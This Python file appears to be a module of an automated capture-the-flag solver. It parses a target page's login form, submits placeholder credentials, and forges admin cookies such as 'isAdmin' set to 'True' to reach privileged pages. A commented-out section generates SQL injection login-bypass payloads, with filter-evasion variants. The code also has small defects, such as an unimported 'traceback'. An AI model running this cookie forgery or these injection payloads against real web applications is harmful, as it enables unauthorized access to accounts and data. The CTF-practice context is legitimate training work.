from unit import BaseUnit
from collections import Counter
import sys
from io import StringIO
import argparse
from pwn import *
import subprocess
import os
import units.raw
import re
import units.web
import requests
import magic
import units

potential_username_variables = [
			'username', 'user', 'uname', 'un', 'name', 'user1', 'input1', 'uw1', 'username1', 'uname1', 'tbUsername', 'usern', 'id'
]
potential_password_variables = [
	'password', 'pass', 'pword', 'pw', 'pass1', 'input2', 'password1', 'pw1', 'pword1', 'tbPassword'
]

user_regex = "<\s*input.*name\s*=\s*['\"](%s)['\"]" % "|".join(potential_username_variables)
pass_regex = "<\s*input.*name\s*=\s*['\"](%s)['\"]" % "|".join(potential_password_variables)

potential_cookie_names = [ 'admin', 'is_admin', 'isadmin', 'administrator', 'isAdmin' ]

class Unit(units.web.WebUnit):

	def __init__(self, katana, parent, target):

		# Run the parent constructor, to ensure this is a valid URL
		super(Unit, self).__init__(katana, parent, target)
		if not katana.config['flag_format']:
			raise units.NotApplicable

		try:
			self.response = requests.get(self.target)
		except requests.exceptions.ConnectionError:
			raise units.NotApplicable

		self.action = re.findall(r"<\s*form.*action\s*=\s*['\"](.+?)['\"]", self.response.text, flags=re.IGNORECASE)
		self.method = re.findall(r"<\s*form.*method\s*=\s*['\"](.+?)['\"]", self.response.text, flags=re.IGNORECASE)

		self.username = re.findall(user_regex, self.response.text, flags=re.IGNORECASE)
		self.password = re.findall(pass_regex, self.response.text, flags=re.IGNORECASE)
		
		# Only run this if we have potential information...
		if not (self.action and self.method and self.username and self.password):
			raise NotApplicable

	# def enumerate(self, katana):
		
	# 	# This should "yield 'name', (params,to,pass,to,evaluate)"
	# 	# evaluate will see this second argument as only one variable and you will need to parse them out
		
	# 	try:
	# 		r = requests.get(self.target)
	# 	except requests.exceptions.ConnectionError:
	# 		return

	# 	action = re.findall(r"<\s*form.*action\s*=\s*('|\")(.+?)('|\")", r.text, flags=re.IGNORECASE)
	# 	method = re.findall(r"<\s*form.*method\s*=\s*('|\")(.+?)('|\")", r.text, flags=re.IGNORECASE)

	# 	potential_username_variables = [
	# 		'username', 'user', 'uname', 'un', 'name', 'user1', 'input1', 'uw1', 'username1', 'uname1', 'tbUsername', 'usern', 'id'
	# 	]
	# 	potential_password_variables = [
	# 		'password', 'pass', 'pword', 'pw', 'pass1', 'input2', 'password1', 'pw1', 'pword1', 'tbPassword'
	# 	]

	# 	user_regex = "<\s*input.*name\s*=\s*('|\")(%s)('|\")" % "|".join(potential_username_variables)
	# 	pass_regex = "<\s*input.*name\s*=\s*('|\")(%s)('|\")" % "|".join(potential_password_variables)

	# 	username = re.findall(user_regex, r.text, flags=re.IGNORECASE)
	# 	password = re.findall(pass_regex, r.text, flags=re.IGNORECASE)

	# 	if action and method and username and password:
	# 		if action: action = action[0][1]
	# 		if method: method = method[0][1]
	# 		if username: username = username[0][1]
	# 		if password: password = password[0][1]

	# 		try:
	# 			method = vars(requests)[method.lower()]
	# 		except IndexError:
	# 			log.warning("Could not find an appropriate HTTP method... defaulting to POST!")
	# 			method = requests.post

	# 		quotes_possibilities = [ "'", '"' ]
	# 		comment_possibilities = [ "--", '#', '/*', '%00' ]
	# 		delimeter_possibilities = [ ' ', '/**/' ]
	# 		test_possibilities = [ 'OR', 'OORR', 'UNION SELECT', 'UNUNIONION SELSELECTECT' ]

	# 		payloads = []
	# 		count_attempt = 0
	# 		for quote in quotes_possibilities:
	# 			for comment in comment_possibilities:
	# 				for delimeter in delimeter_possibilities:
	# 					for test in test_possibilities:

	# 						payload = quote + delimeter + test.replace(' ' ,delimeter) + delimeter + '1' + delimeter + comment
	# 						count_attempt += 1
	# 						yield (method, action, username, password, payload)

	# 	else:
	# 		return # This will tell THE WHOLE UNIT to stop... it will no longer generate cases.


	def evaluate(self, katana, case):
		# Split up the target (see get_cases)
		# method, action, username, password, payload = case
		if self.action and self.method and self.username and self.password:
			if self.action: action = self.action[0]
			if self.method: method = self.method[0]
			if self.username: username = self.username[0]
			if self.password: password = self.password[0]

			s = requests.Session()
			try:
				r = s.request(method.lower(), self.target.rstrip('/') + '/' + action, data = { username: "anything", password : "anything"})
			except:
				# JOHN: Theoretically, if we find a valid method, this should not error...
				#       But if it does, we should see it.
				traceback.print_exc()
			
			# Check out the cookies. Flip them if they are boolean, look for flags.
			if s.cookies:
				for admin_cookie in potential_cookie_names:
					if admin_cookie in s.cookies.keys():
						if s.cookies[admin_cookie] == 'False':
							new = requests.get(r.url, cookies = { admin_cookie : 'True' })
							if katana.locate_flags(self, new.text): break
						else:
							new = requests.get(r.url, cookies = { admin_cookie : '1' })
							if katana.locate_flags(self, new.text): break

		
		return None
